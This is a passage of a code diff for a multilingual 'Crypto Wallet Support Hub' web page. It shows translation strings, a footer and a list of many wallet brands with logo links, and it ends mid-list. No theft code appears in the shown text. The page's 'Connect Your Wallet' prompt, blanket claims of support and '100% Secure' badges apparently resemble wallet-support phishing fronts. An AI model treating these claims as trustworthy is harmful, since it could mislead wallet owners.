+                  >Browse Wallets</a
+                >
+              </li>
+              <li>
+                <a
+                  href="#"
+                  onclick="navigateTo('issues'); return false;"
+                  data-i18n="footer.getHelp"
+                  >Get Help</a
+                >
+              </li>
+              <li>
+                <a
+                  href="#"
+                  onclick="toggleTheme(); return false;"
+                  data-i18n="footer.toggleTheme"
+                  >Toggle Theme</a
+                >
+              </li>
+            </ul>
+          </div>
+          <div class="footer-section">
+            <h3 class="footer-title" data-i18n="footer.support">Support</h3>
+            <p data-i18n="footer.supportDesc">
+              24/7 Community support for all your crypto wallet needs. Submit
+              issues and get help from our team.
+            </p>
+          </div>
+        </div>
+        <div class="footer-bottom">
+          <div class="footer-copyright">
+            <p data-i18n="footer.copyright">
+              &copy; 2024 Crypto Wallet Support Hub. All rights reserved.
+            </p>
+          </div>
+          <div class="footer-badge">
+            <span class="badge">
+              <i class="fas fa-shield-alt"></i>
+              <span data-i18n="footer.secure">Secure & Safe</span>
+            </span>
+            <span class="badge">
+              <i class="fas fa-globe"></i>
+              <span data-i18n="footer.global">Global Support</span>
+            </span>
+          </div>
+        </div>
+      </div>
+    </footer>
+
+    <script>
+      // i18n Translations
+      const TRANSLATIONS = {
+        en: {
+          nav: { browse: "Browse", support: "Support" },
+          home: {
+            title: "Connect Your Wallet",
+            subtitle: "Get instant support for 114+ cryptocurrency wallets",
+            description:
+              "Select your wallet provider to access secure resources and community support",
+            stat1: "Wallets Supported",
+            stat2: "Community Help",
+            stat3: "Secure & Safe",
+            search: "Search wallets...",
+            chooseWallet: "Choose Your Wallet",
+          },
+          issues: {
+            back: "Back to Wallets",
+            title: "Crypto Issues Support",
+            subtitle:
+              "Get help with common crypto wallet problems and submit your issues",
+            commonIssues: "Common Issues",
+            description: "Quick solutions for frequent crypto problems",
+            submitForm: "Submit Your Issue",
+            submitDescription:
+              "Describe your problem and we'll help you resolve it",
+            walletLabel: "Wallet Address (Optional)",
+            issueTypeLabel: "Issue Type",
+            selectIssue: "Select an issue...",
+            descriptionLabel: "Description",
+            descriptionPlaceholder: "Describe your issue...",
+            submitBtn: "Submit Issue",
+          },
+          footer: {
+            about: "About",
+            aboutDesc:
+              "Your trusted guide for resolving cryptocurrency wallet issues and getting instant support for 114+ wallets.",
+            links: "Quick Links",
+            browseWallets: "Browse Wallets",
+            getHelp: "Get Help",
+            toggleTheme: "Toggle Theme",
+            support: "Support",
+            supportDesc:
+              "24/7 Community support for all your crypto wallet needs. Submit issues and get help from our team.",
+            copyright:
+              "© 2024 Crypto Wallet Support Hub. All rights reserved.",
+            secure: "Secure & Safe",
+            global: "Global Support",
+          },
         },
-        issues: {
-          back: "Back to Wallets",
-          title: "Crypto Issues Support",
-          subtitle: "Get help with common crypto wallet problems and submit your issues",
-          commonIssues: "Common Issues",
-          description: "Quick solutions for frequent crypto problems",
-          submitForm: "Submit Your Issue",
-          submitDescription: "Describe your problem and we'll help you resolve it",
-          walletLabel: "Wallet Address (Optional)",
-          issueTypeLabel: "Issue Type",
-          selectIssue: "Select an issue...",
-          descriptionLabel: "Description",
-          descriptionPlaceholder: "Describe your issue...",
-          submitBtn: "Submit Issue"
+        es: {
+          nav: { browse: "Explorar", support: "Soporte" },
+          home: {
+            title: "Conectar Tu Billetera",
+            subtitle:
+              "Obtén soporte instantáneo para 114+ billeteras de criptomonedas",
+            description:
+              "Selecciona tu proveedor de billetera para acceder a recursos seguros y soporte comunitario",
+            stat1: "Billeteras Compatibles",
+            stat2: "Ayuda 24/7",
+            stat3: "100% Seguro",
+            search: "Buscar billeteras...",
+            chooseWallet: "Elige Tu Billetera",
+          },
+          issues: {
+            back: "Volver a Billeteras",
+            title: "Soporte de Problemas Cripto",
+            subtitle:
+              "Obtén ayuda con problemas comunes de billeteras cripto y envía tus problemas",
+            commonIssues: "Problemas Comunes",
+            description:
+              "Soluciones rápidas para problemas frecuentes de cripto",
+            submitForm: "Enviar Tu Problema",
+            submitDescription:
+              "Describe tu problema y te ayudaremos a resolverlo",
+            walletLabel: "Dirección de Billetera (Opcional)",
+            issueTypeLabel: "Tipo de Problema",
+            selectIssue: "Selecciona un problema...",
+            descriptionLabel: "Descripción",
+            descriptionPlaceholder: "Describe tu problema...",
+            submitBtn: "Enviar Problema",
+          },
+          footer: {
+            about: "Acerca de",
+            aboutDesc:
+              "Tu guía de confianza para resolver problemas de billeteras de criptomonedas y obtener soporte instantáneo para 114+ billeteras.",
+            links: "Enlaces Rápidos",
+            browseWallets: "Explorar Billeteras",
+            getHelp: "Obtener Ayuda",
+            toggleTheme: "Cambiar Tema",
+            support: "Soporte",
+            supportDesc:
+              "Soporte comunitario 24/7 para todas tus necesidades de billeteras cripto. Envía problemas y obtén ayuda de nuestro equipo.",
+            copyright:
+              "© 2024 Centro de Soporte de Billeteras Cripto. Todos los derechos reservados.",
+            secure: "100% Seguro",
+            global: "Soporte Global",
+          },
         },
-        footer: {
-          about: "About",
-          aboutDesc: "Your trusted guide for resolving cryptocurrency wallet issues and getting instant support for 114+ wallets.",
-          links: "Quick Links",
-          browseWallets: "Browse Wallets",
-          getHelp: "Get Help",
-          toggleTheme: "Toggle Theme",
-          support: "Support",
-          supportDesc: "24/7 Community support for all your crypto wallet needs. Submit issues and get help from our team.",
-          copyright: "© 2024 Crypto Wallet Support Hub. All rights reserved.",
-          secure: "Secure & Safe",
-          global: "Global Support"
-        }
-      },
-      es: {
-        nav: { browse: "Explorar", support: "Soporte" },
-        home: {
-          title: "Conectar Tu Billetera",
-          subtitle: "Obtén soporte instantáneo para 114+ billeteras de criptomonedas",
-          description: "Selecciona tu proveedor de billetera para acceder a recursos seguros y soporte comunitario",
-          stat1: "Billeteras Compatibles",
-          stat2: "Ayuda 24/7",
-          stat3: "100% Seguro",
-          search: "Buscar billeteras...",
-          chooseWallet: "Elige Tu Billetera"
+        fr: {
+          nav: { browse: "Parcourir", support: "Support" },
+          home: {
+            title: "Connecter Votre Portefeuille",
+            subtitle:
+              "Obtenez un support instantané pour 114+ portefeuilles de cryptomonnaies",
+            description:
+              "Sélectionnez votre fournisseur de portefeuille pour accéder aux ressources sécurisées et au support communautaire",
+            stat1: "Portefeuilles Supportés",
+            stat2: "Aide 24/7",
+            stat3: "100% Sécurisé",
+            search: "Rechercher des portefeuilles...",
+            chooseWallet: "Choisissez Votre Portefeuille",
+          },
+          issues: {
+            back: "Retour aux Portefeuilles",
+            title: "Support des Problèmes Cryptographiques",
+            subtitle:
+              "Obtenez de l'aide pour les problèmes courants de portefeuille cryptographique et soumettez vos problèmes",
+            commonIssues: "Problèmes Courants",
+            description:
+              "Solutions rapides pour les problèmes fréquents de cryptographie",
+            submitForm: "Soumettre Votre Problème",
+            submitDescription:
+              "Décrivez votre problème et nous vous aiderons à le résoudre",
+            walletLabel: "Adresse du Portefeuille (Facultatif)",
+            issueTypeLabel: "Type de Problème",
+            selectIssue: "Sélectionnez un problème...",
+            descriptionLabel: "Description",
+            descriptionPlaceholder: "Décrivez votre problème...",
+            submitBtn: "Soumettre le Problème",
+          },
+          footer: {
+            about: "À Propos",
+            aboutDesc:
+              "Votre guide de confiance pour résoudre les problèmes de portefeuille de cryptomonnaie et obtenir un support instantané pour 114+ portefeuilles.",
+            links: "Liens Rapides",
+            browseWallets: "Parcourir les Portefeuilles",
+            getHelp: "Obtenir de l'Aide",
+            toggleTheme: "Changer le Thème",
+            support: "Support",
+            supportDesc:
+              "Support communautaire 24/7 pour tous vos besoins en portefeuille cryptographique. Soumettez des problèmes et obtenez de l'aide de notre équipe.",
+            copyright:
+              "© 2024 Centre d'Assistance Crypto Wallet. Tous droits réservés.",
+            secure: "100% Sécurisé",
+            global: "Support Global",
+          },
         },
-        issues: {
-          back: "Volver a Billeteras",
-          title: "Soporte de Problemas Cripto",
-          subtitle: "Obtén ayuda con problemas comunes de billeteras cripto y envía tus problemas",
-          commonIssues: "Problemas Comunes",
-          description: "Soluciones rápidas para problemas frecuentes de cripto",
-          submitForm: "Enviar Tu Problema",
-          submitDescription: "Describe tu problema y te ayudaremos a resolverlo",
-          walletLabel: "Dirección de Billetera (Opcional)",
-          issueTypeLabel: "Tipo de Problema",
-          selectIssue: "Selecciona un problema...",
-          descriptionLabel: "Descripción",
-          descriptionPlaceholder: "Describe tu problema...",
-          submitBtn: "Enviar Problema"
+        de: {
+          nav: { browse: "Durchsuchen", support: "Unterstützung" },
+          home: {
+            title: "Verbinden Sie Ihr Wallet",
+            subtitle:
+              "Erhalten Sie sofortige Unterstützung für 114+ Kryptowährungs-Wallets",
+            description:
+              "Wählen Sie Ihren Wallet-Anbieter, um auf sichere Ressourcen und Gemeinschaftsunterstützung zuzugreifen",
+            stat1: "Unterstützte Wallets",
+            stat2: "Hilfe 24/7",
+            stat3: "100% Sicher",
+            search: "Wallets durchsuchen...",
+            chooseWallet: "Wählen Sie Ihr Wallet",
+          },
+          issues: {
+            back: "Zurück zu Wallets",
+            title: "Kryptographie-Problem-Support",
+            subtitle:
+              "Erhalten Sie Hilfe bei häufigen Problemen mit Kryptowährungs-Wallets und reichen Sie Ihre Probleme ein",
+            commonIssues: "Häufige Probleme",
+            description: "Schnelle Lösungen für häufige Kryptographie-Probleme",
+            submitForm: "Reichen Sie Ihr Problem Ein",
+            submitDescription:
+              "Beschreiben Sie Ihr Problem und wir helfen Ihnen, es zu lösen",
+            walletLabel: "Wallet-Adresse (Optional)",
+            issueTypeLabel: "Problemtyp",
+            selectIssue: "Wählen Sie ein Problem...",
+            descriptionLabel: "Beschreibung",
+            descriptionPlaceholder: "Beschreiben Sie Ihr Problem...",
+            submitBtn: "Problem Einreichen",
+          },
+          footer: {
+            about: "Über",
+            aboutDesc:
+              "Ihr vertrauenswürdiger Leitfaden zur Lösung von Kryptowährungs-Wallet-Problemen und zum Erhalten von sofortiger Unterstützung für 114+ Wallets.",
+            links: "Schnelllinks",
+            browseWallets: "Wallets Durchsuchen",
+            getHelp: "Hilfe Erhalten",
+            toggleTheme: "Design Wechseln",
+            support: "Unterstützung",
+            supportDesc:
+              "Rund-um-die-Uhr Gemeinschaftsunterstützung für alle Ihre Kryptowährungs-Wallet-Anforderungen. Reichen Sie Probleme ein und erhalten Sie Hilfe von unserem Team.",
+            copyright:
+              "© 2024 Crypto Wallet Support Hub. Alle Rechte vorbehalten.",
+            secure: "100% Sicher",
+            global: "Globale Unterstützung",
+          },
         },
-        footer: {
-          about: "Acerca de",
-          aboutDesc: "Tu guía de confianza para resolver problemas de billeteras de criptomonedas y obtener soporte instantáneo para 114+ billeteras.",
-          links: "Enlaces Rápidos",
-          browseWallets: "Explorar Billeteras",
-          getHelp: "Obtener Ayuda",
-          toggleTheme: "Cambiar Tema",
-          support: "Soporte",
-          supportDesc: "Soporte comunitario 24/7 para todas tus necesidades de billeteras cripto. Envía problemas y obtén ayuda de nuestro equipo.",
-          copyright: "© 2024 Centro de Soporte de Billeteras Cripto. Todos los derechos reservados.",
-          secure: "100% Seguro",
-          global: "Soporte Global"
-        }
-      },
-      fr: {
-        nav: { browse: "Parcourir", support: "Support" },
-        home: {
-          title: "Connecter Votre Portefeuille",
-          subtitle: "Obtenez un support instantané pour 114+ portefeuilles de cryptomonnaies",
-          description: "Sélectionnez votre fournisseur de portefeuille pour accéder aux ressources sécurisées et au support communautaire",
-          stat1: "Portefeuilles Supportés",
-          stat2: "Aide 24/7",
-          stat3: "100% Sécurisé",
-          search: "Rechercher des portefeuilles...",
-          chooseWallet: "Choisissez Votre Portefeuille"
+        zh: {
+          nav: { browse: "浏览", support: "支持" },
+          home: {
+            title: "连接您的钱包",
+            subtitle: "获取114+加密货币钱包的即时支持",
+            description: "选择您的钱包提供商以访问安全资源和社区支持",
+            stat1: "支持的钱包",
+            stat2: "全天候帮助",
+            stat3: "100%安全",
+            search: "搜索钱包...",
+            chooseWallet: "选择您的钱包",
+          },
+          issues: {
+            back: "返回钱包",
+            title: "加密问题支持",
+            subtitle: "获取关于常见加密钱包问题的帮助并提交您的问题",
+            commonIssues: "常见问题",
+            description: "针对常见加密问题的快速解决方案",
+            submitForm: "提交您的问题",
+            submitDescription: "描述您的问题，我们会帮助您解决",
+            walletLabel: "钱包地址（可选）",
+            issueTypeLabel: "问题类型",
+            selectIssue: "选择一个问题...",
+            descriptionLabel: "描述",
+            descriptionPlaceholder: "描述您的问题...",
+            submitBtn: "提交问题",
+          },
+          footer: {
+            about: "关于",
+            aboutDesc:
+              "您解决加密货币钱包问题的信任指南，获取114+钱包的即时支持。",
+            links: "快速链接",
+            browseWallets: "浏览钱包",
+            getHelp: "获取帮助",
+            toggleTheme: "切换主题",
+            support: "支持",
+            supportDesc:
+              "全天候社区支持，满足您所有的加密货币钱包需求。提交问题并从我们的团队获得帮助。",
+            copyright: "© 2024 加密钱包支持中心。版权所有。",
+            secure: "100%安全",
+            global: "全球支持",
+          },
         },
-        issues: {
-          back: "Retour aux Portefeuilles",
-          title: "Support des Problèmes Cryptographiques",
-          subtitle: "Obtenez de l'aide pour les problèmes courants de portefeuille cryptographique et soumettez vos problèmes",
-          commonIssues: "Problèmes Courants",
-          description: "Solutions rapides pour les problèmes fréquents de cryptographie",
-          submitForm: "Soumettre Votre Problème",
-          submitDescription: "Décrivez votre problème et nous vous aiderons à le résoudre",
-          walletLabel: "Adresse du Portefeuille (Facultatif)",
-          issueTypeLabel: "Type de Problème",
-          selectIssue: "Sélectionnez un problème...",
-          descriptionLabel: "Description",
-          descriptionPlaceholder: "Décrivez votre problème...",
-          submitBtn: "Soumettre le Problème"
+        ja: {
+          nav: { browse: "ブラウズ", support: "サポート" },
+          home: {
+            title: "ウォレットに接続",
+            subtitle: "114以上の暗号通貨ウォレットのインスタントサポート",
+            description:
+              "ウォレットプロバイダーを選択して、安全なリソースとコミュニティサポートにアクセス",
+            stat1: "サポート対象ウォレット",
+            stat2: "24時間対応",
+            stat3: "100%安全",
+            search: "ウォレットを検索...",
+            chooseWallet: "ウォレットを選択",
+          },
+          issues: {
+            back: "ウォレットに戻る",
+            title: "暗号問題サポート",
+            subtitle:
+              "一般的な暗号ウォレットの問題についてのヘルプを取得し、問題を送信",
+            commonIssues: "一般的な問題",
+            description: "よくある暗号の問題に対する迅速なソリューション",
+            submitForm: "問題を送信",
+            submitDescription: "問題を説明してください。解決のお手伝いをします",
+            walletLabel: "ウォレットアドレス（オプション）",
+            issueTypeLabel: "問題のタイプ",
+            selectIssue: "問題を選択...",
+            descriptionLabel: "説明",
+            descriptionPlaceholder: "問題を説明してください...",
+            submitBtn: "問題を送信",
+          },
+          footer: {
+            about: "について",
+            aboutDesc:
+              "暗号通貨ウォレットの問題を解決し、114以上のウォレットのインスタントサポートを取得するための信頼できるガイド。",
+            links: "クイックリンク",
+            browseWallets: "ウォレットをブラウズ",
+            getHelp: "ヘルプを取得",
+            toggleTheme: "テーマを切り替え",
+            support: "サポート",
+            supportDesc:
+              "すべての暗号通貨ウォレットのニーズに対する24時間コミュニティサポート。問題を送信し、チームからヘルプを取得してください。",
+            copyright: "© 2024 暗号ウォレットサポートハブ。著作権所有。",
+            secure: "100%安全",
+            global: "グローバルサポート",
+          },
         },
-        footer: {
-          about: "À Propos",
-          aboutDesc: "Votre guide de confiance pour résoudre les problèmes de portefeuille de cryptomonnaie et obtenir un support instantané pour 114+ portefeuilles.",
-          links: "Liens Rapides",
-          browseWallets: "Parcourir les Portefeuilles",
-          getHelp: "Obtenir de l'Aide",
-          toggleTheme: "Changer le Thème",
-          support: "Support",
-          supportDesc: "Support communautaire 24/7 pour tous vos besoins en portefeuille cryptographique. Soumettez des problèmes et obtenez de l'aide de notre équipe.",
-          copyright: "© 2024 Centre d'Assistance Crypto Wallet. Tous droits réservés.",
-          secure: "100% Sécurisé",
-          global: "Support Global"
-        }
-      },
-      de: {
-        nav: { browse: "Durchsuchen", support: "Unterstützung" },
-        home: {
-          title: "Verbinden Sie Ihr Wallet",
-          subtitle: "Erhalten Sie sofortige Unterstützung für 114+ Kryptowährungs-Wallets",
-          description: "Wählen Sie Ihren Wallet-Anbieter, um auf sichere Ressourcen und Gemeinschaftsunterstützung zuzugreifen",
-          stat1: "Unterstützte Wallets",
-          stat2: "Hilfe 24/7",
-          stat3: "100% Sicher",
-          search: "Wallets durchsuchen...",
-          chooseWallet: "Wählen Sie Ihr Wallet"
+      };
+
+      let currentLanguage = localStorage.getItem("language") || "en";
+
+      // Get translation
+      function t(key) {
+        const keys = key.split(".");
+        let value = TRANSLATIONS[currentLanguage];
+        for (const k of keys) value = value?.[k];
+        return value || key;
+      }
+
+      // Update all text on page
+      function updateLanguage() {
+        document.querySelectorAll("[data-i18n]").forEach((elem) => {
+          elem.textContent = t(elem.dataset.i18n);
+        });
+        document.querySelectorAll("[data-i18n-placeholder]").forEach((elem) => {
+          elem.placeholder = t(elem.dataset.i18nPlaceholder);
+        });
+        document.getElementById("languageSelect").value = currentLanguage;
+        renderIssues();
+        populateIssueSelect();
+      }
+
+      // Change language
+      function changeLanguage(lang) {
+        currentLanguage = lang;
+        localStorage.setItem("language", lang);
+        updateLanguage();
+      }
+
+      // Wallet data
+      const WALLETS = [
+        {
+          id: "metamask",
+          name: "MetaMask",
+          logo: "https://www.pngall.com/wp-content/uploads/17/Metama.png",
         },
-        issues: {
-          back: "Zurück zu Wallets",
-          title: "Kryptographie-Problem-Support",
-          subtitle: "Erhalten Sie Hilfe bei häufigen Problemen mit Kryptowährungs-Wallets und reichen Sie Ihre Probleme ein",
-          commonIssues: "Häufige Probleme",
-          description: "Schnelle Lösungen für häufige Kryptographie-Probleme",
-          submitForm: "Reichen Sie Ihr Problem Ein",
-          submitDescription: "Beschreiben Sie Ihr Problem und wir helfen Ihnen, es zu lösen",
-          walletLabel: "Wallet-Adresse (Optional)",
-          issueTypeLabel: "Problemtyp",
-          selectIssue: "Wählen Sie ein Problem...",
-          descriptionLabel: "Beschreibung",
-          descriptionPlaceholder: "Beschreiben Sie Ihr Problem...",
-          submitBtn: "Problem Einreichen"
+        {
+          id: "trust",
+          name: "Trust Wallet",
+          logo: "https://logo.clearbit.com/trustwallet.com",
         },
-        footer: {
-          about: "Über",
-          aboutDesc: "Ihr vertrauenswürdiger Leitfaden zur Lösung von Kryptowährungs-Wallet-Problemen und zum Erhalten von sofortiger Unterstützung für 114+ Wallets.",
-          links: "Schnelllinks",
-          browseWallets: "Wallets Durchsuchen",
-          getHelp: "Hilfe Erhalten",
-          toggleTheme: "Design Wechseln",
-          support: "Unterstützung",
-          supportDesc: "Rund-um-die-Uhr Gemeinschaftsunterstützung für alle Ihre Kryptowährungs-Wallet-Anforderungen. Reichen Sie Probleme ein und erhalten Sie Hilfe von unserem Team.",
-          copyright: "© 2024 Crypto Wallet Support Hub. Alle Rechte vorbehalten.",
-          secure: "100% Sicher",
-          global: "Globale Unterstützung"
-        }
-      },
-      zh: {
-        nav: { browse: "浏览", support: "支持" },
-        home: {
-          title: "连接您的钱包",
-          subtitle: "获取114+加密货币钱包的即时支持",
-          description: "选择您的钱包提供商以访问安全资源和社区支持",
-          stat1: "支持的钱包",
-          stat2: "全天候帮助",
-          stat3: "100%安全",
-          search: "搜索钱包...",
-          chooseWallet: "选择您的钱包"
+        {
+          id: "ledger",
+          name: "Ledger",
+          logo: "https://logo.clearbit.com/ledger.com",
         },
-        issues: {
-          back: "返回钱包",
-          title: "加密问题支持",
-          subtitle: "获取关于常见加密钱包问题的帮助并提交您的问题",
-          commonIssues: "常见问题",
-          description: "针对常见加密问题的快速解决方案",
-          submitForm: "提交您的问题",
-          submitDescription: "描述您的问题，我们会帮助您解决",
-          walletLabel: "钱包地址（可选）",
-          issueTypeLabel: "问题类型",
-          selectIssue: "选择一个问题...",
-          descriptionLabel: "描述",
-          descriptionPlaceholder: "描述您的问题...",
-          submitBtn: "提交问题"
+        {
+          id: "trezor",
+          name: "Trezor",
+          logo: "https://logo.clearbit.com/trezor.io",
         },
-        footer: {
-          about: "关于",
-          aboutDesc: "您解决加密货币钱包问题的信任指南，获取114+钱包的即时支持。",
-          links: "快速链接",
-          browseWallets: "浏览钱包",
-          getHelp: "获取帮助",
-          toggleTheme: "切换主题",
-          support: "支持",
-          supportDesc: "全天候社区支持，满足您所有的加密货币钱包需求。提交问题并从我们的团队获得帮助。",
-          copyright: "© 2024 加密钱包支持中心。版权所有。",
-          secure: "100%安全",
-          global: "全球支持"
-        }
-      },
-      ja: {
-        nav: { browse: "ブラウズ", support: "サポート" },
-        home: {
-          title: "ウォレットに接続",
-          subtitle: "114以上の暗号通貨ウォレットのインスタントサポート",
-          description: "ウォレットプロバイダーを選択して、安全なリソースとコミュニティサポートにアクセス",
-          stat1: "サポート対象ウォレット",
-          stat2: "24時間対応",
-          stat3: "100%安全",
-          search: "ウォレットを検索...",
-          chooseWallet: "ウォレットを選択"
+        {
+          id: "exodus",
+          name: "Exodus",
+          logo: "https://logo.clearbit.com/exodus.com",
         },
-        issues: {
-          back: "ウォレットに戻る",
-          title: "暗号問題サポート",
-          subtitle: "一般的な暗号ウォレットの問題についてのヘルプを取得し、問題を送信",
-          commonIssues: "一般的な問題",
-          description: "よくある暗号の問題に対する迅速なソリューション",
-          submitForm: "問題を送信",
-          submitDescription: "問題を説明してください。解決のお手伝いをします",
-          walletLabel: "ウォレットアドレス（オプション）",
-          issueTypeLabel: "問題のタイプ",
-          selectIssue: "問題を選択...",
-          descriptionLabel: "説明",
-          descriptionPlaceholder: "問題を説明してください...",
-          submitBtn: "問題を送信"
+        {
+          id: "coinbase",
+          name: "Coinbase Wallet",
+          logo: "https://logo.clearbit.com/coinbase.com",
         },
-        footer: {
-          about: "について",
-          aboutDesc: "暗号通貨ウォレットの問題を解決し、114以上のウォレットのインスタントサポートを取得するための信頼できるガイド。",
-          links: "クイックリンク",
-          browseWallets: "ウォレットをブラウズ",
-          getHelp: "ヘルプを取得",
-          toggleTheme: "テーマを切り替え",
-          support: "サポート",
-          supportDesc: "すべての暗号通貨ウォレットのニーズに対する24時間コミュニティサポート。問題を送信し、チームからヘルプを取得してください。",
-          copyright: "© 2024 暗号ウォレットサポートハブ。著作権所有。",
-          secure: "100%安全",
-          global: "グローバルサポート"
+        {
+          id: "mew",
+          name: "MyEtherWallet (MEW)",
+          logo: "https://logo.clearbit.com/myetherwallet.com",
+        },
+        {
+          id: "blockchain",
+          name: "Blockchain.com Wallet",
+          logo: "https://logo.clearbit.com/blockchain.com",
+        },
+        {
+          id: "electrum",
+          name: "Electrum",
+          logo: "https://logo.clearbit.com/electrum.org",
+        },
+        {
+          id: "mycelium",
+          name: "Mycelium",
+          logo: "https://logo.clearbit.com/mycelium.com",
+        },
+        {
+          id: "coinomi",
+          name: "Coinomi",
+          logo: "https://logo.clearbit.com/coinomi.com",
+        },
+        {
+          id: "atomic",
+          name: "Atomic Wallet",
+          logo: "https://logo.clearbit.com/atomicwallet.io",
+        },
+        {
+          id: "guarda",
+          name: "Guarda",
+          logo: "https://logo.clearbit.com/guarda.com",
+        },
+        {
+          id: "bitpay",
+          name: "BitPay",
+          logo: "https://logo.clearbit.com/bitpay.com",
+        },
+        {
+          id: "zengo",
+          name: "ZenGo",
+          logo: "https://logo.clearbit.com/zengo.com",
+        },
+        {
+          id: "safepal",
+          name: "SafePal",
+          logo: "https://logo.clearbit.com/safepal.io",
+        },
+        {
+          id: "brave",
+          name: "Brave Wallet",
+          logo: "https://logo.clearbit.com/brave.com",
+        },
+        {
+          id: "phantom",
+          name: "Phantom",
+          logo: "https://logo.clearbit.com/phantom.app",
+        },
+        {
+          id: "solflare",
+          name: "Solflare",
+          logo: "https://logo.clearbit.com/solflare.com",
+        },
+        {
+          id: "rainbow",
+          name: "Rainbow",
+          logo: "https://logo.clearbit.com/rainbow.me",
+        },
+        {
+          id: "argent",
+          name: "Argent",
+          logo: "https://logo.clearbit.com/argent.com",
+        },
+        {
+          id: "imtoken",
+          name: "imToken",
+          logo: "https://logo.clearbit.com/imtoken.org",
+        },
+        {
+          id: "portis",
+          name: "Portis",
+          logo: "https://logo.clearbit.com/portis.io",
+        },
+        {
+          id: "magic",
+          name: "Magic (Fortmatic)",
+          logo: "https://logo.clearbit.com/magic.link",
+        },
+        {
+          id: "gnosissafe",
+          name: "Gnosis Safe",
+          logo: "https://logo.clearbit.com/gnosis-safe.io",
+        },
+        {
+          id: "trustology",
+          name: "Trustology",
+          logo: "https://logo.clearbit.com/trustology.io",
+        },
+        { id: "brd", name: "BRD", logo: "https://logo.clearbit.com/brd.com" },
+        {
+          id: "paxful",
+          name: "Paxful",
+          logo: "https://logo.clearbit.com/paxful.com",
+        },
+        {
+          id: "bitgo",
+          name: "BitGo",
+          logo: "https://logo.clearbit.com/bitgo.com",
+        },
+        {
+          id: "armory",
+          name: "Armory",
+          logo: "https://logo.clearbit.com/armory.io",
+        },
+        {
+          id: "jaxx",
+          name: "Jaxx Liberty",
+          logo: "https://logo.clearbit.com/jaxx.io",
+        },
+        {
+          id: "coinpayments",
+          name: "CoinPayments",
+          logo: "https://logo.clearbit.com/coinpayments.net",
+        },
+        {
+          id: "edge",
+          name: "Edge Wallet",
+          logo: "https://logo.clearbit.com/edge.app",
+        },
+        {
+          id: "tokenpocket",
+          name: "TokenPocket",
+          logo: "https://logo.clearbit.com/tokenpocket.pro",
+        },
+        {
+          id: "mathwallet",
+          name: "MathWallet",
+          logo: "https://logo.clearbit.com/mathwallet.org",
+        },
+        {
+          id: "onto",
+          name: "Onto Wallet",
+          logo: "https://logo.clearbit.com/onto.app",
+        },
+        {
+          id: "keepkey",
+          name: "KeepKey",
+          logo: "https://logo.clearbit.com/keepkey.com",
+        },
+        {
+          id: "huobi",
+          name: "Huobi Wallet",
+          logo: "https://logo.clearbit.com/huobiwallet.com",
+        },
+        {
+          id: "okx",
+          name: "OKX Wallet",
+          logo: "https://logo.clearbit.com/okx.com",
+        },
+        {
+          id: "binance",
+          name: "Binance Wallet",
+          logo: "https://logo.clearbit.com/binance.com",
+        },
+        {
+          id: "coin98",
+          name: "Coin98 Wallet",
+          logo: "https://logo.clearbit.com/coin98.com",
+        },
+        {
+          id: "slope",
+          name: "Slope Wallet",
+          logo: "https://logo.clearbit.com/slope.finance",
+        },
+        {
+          id: "sollet",
+          name: "Sollet",
+          logo: "https://logo.clearbit.com/sollet.io",
+        },
+        {
+          id: "torus",
+          name: "Torus",
+          logo: "https://logo.clearbit.com/tor.us",
+        },
+        {
+          id: "web3auth",
+          name: "Web3Auth",
+          logo: "https://logo.clearbit.com/web3auth.io",
+        },
+        {
+          id: "sequence",
+          name: "Sequence",
+          logo: "https://logo.clearbit.com/sequence.xyz",
+        },
+        {
+          id: "coldcard",
+          name: "Coldcard",
+          logo: "https://logo.clearbit.com/coldcardwallet.com",
+        },
+        {
+          id: "bitbox",
+          name: "BitBox (Shift Crypto)",
+          logo: "https://logo.clearbit.com/shiftcrypto.ch",
+        },
+        {
+          id: "ellipal",
+          name: "Ellipal",
+          logo: "https://logo.clearbit.com/ellipal.com",
+        },
+        {
+          id: "blockwallet",
+          name: "BlockWallet",
+          logo: "https://logo.clearbit.com/blockwallet.io",
+        },
+        {
+          id: "greymass",
+          name: "Greymass Anchor",
+          logo: "https://logo.clearbit.com/greymass.com",
+        },
+        {
+          id: "zelcore",
+          name: "ZelCore",
+          logo: "https://logo.clearbit.com/zelcore.io",
+        },
+        {
+          id: "klever",
+          name: "Klever",
+          logo: "https://logo.clearbit.com/klever.io",
+        },
+        {
+          id: "freewallet",
+          name: "Freewallet",
+          logo: "https://logo.clearbit.com/freewallet.org",
+        },
+        {
+          id: "safe",
+          name: "Safe (Gnosis)",
+          logo: "https://logo.clearbit.com/safe.global",
+        },
+        {
+          id: "kraken",
+          name: "Kraken Wallet",
+          logo: "https://logo.clearbit.com/kraken.com",
+        },
+        {
+          id: "bybit",
+          name: "Bybit Wallet",
+          logo: "https://logo.clearbit.com/bybit.com",
+        },
+        {
+          id: "cryptocom",
+          name: "Crypto.com DeFi Wallet",
+          logo: "https://logo.clearbit.com/crypto.com",
+        },
+        {
+          id: "paybis",
+          name: "Paybis Wallet",
+          logo: "https://logo.clearbit.com/paybis.com",
+        },
+        {
+          id: "lobstr",
+          name: "Lobstr Wallet",
+          logo: "https://logo.clearbit.com/lobstr.co",
+        },
+        {
+          id: "stellarterm",
+          name: "StellarTerm",
+          logo: "https://logo.clearbit.com/stellarterm.com",
+        },
+        {
+          id: "solar",
+          name: "Solar Wallet",
+          logo: "https://logo.clearbit.com/solar.org",
+        },
+        {
+          id: "nami",
+          name: "Nami Wallet",
+          logo: "https://logo.clearbit.com/namiwallet.io",
+        },
+        {
+          id: "eternl",
+          name: "Eternl Wallet",
+          logo: "https://logo.clearbit.com/eternl.io",
+        },
+        {
+          id: "flint",
+          name: "Flint Wallet",
+          logo: "https://logo.clearbit.com/flint-wallet.com",
+        },
+        {
+          id: "typhon",
+          name: "Typhon Wallet",
+          logo: "https://logo.clearbit.com/typhonwallet.io",
+        },
+        {
+          id: "yoroi",
+          name: "Yoroi",
+          logo: "https://logo.clearbit.com/yoroi-wallet.com",
+        },
+        {
+          id: "keplr",
+          name: "Keplr Wallet",
+          logo: "https://logo.clearbit.com/keplr.app",
+        },
+        {
+          id: "cosmostation",
+          name: "Cosmostation",
+          logo: "https://logo.clearbit.com/cosmostation.io",
+        },
+        {
+          id: "leap",
+          name: "Leap Wallet",
+          logo: "https://logo.clearbit.com/leapwallet.io",
+        },
+        {
+          id: "xdefi",
+          name: "XDEFI Wallet",
+          logo: "https://logo.clearbit.com/xdefi.io",
+        },
+        {
+          id: "rabby",
+          name: "Rabby Wallet",
+          logo: "https://logo.clearbit.com/rabby.io",
+        },
+        {
+          id: "frame",
+          name: "Frame Wallet",
+          logo: "https://logo.clearbit.com/frame.sh",
+        },
+        {
+          id: "temple",
